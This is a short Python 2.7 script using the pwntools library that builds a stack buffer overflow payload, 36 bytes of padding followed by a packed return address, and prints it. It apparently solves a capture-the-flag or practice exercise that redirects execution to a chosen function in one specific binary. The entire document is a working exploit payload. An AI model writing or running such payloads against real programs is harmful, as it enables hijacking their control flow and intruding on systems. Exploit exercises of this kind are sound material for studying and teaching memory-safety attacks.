#!/usr/bin/python2.7
from pwn import *

buf = ''
buf += "A" * 36
#next address is return function address
buf += p32(0x565561c9)

print buf

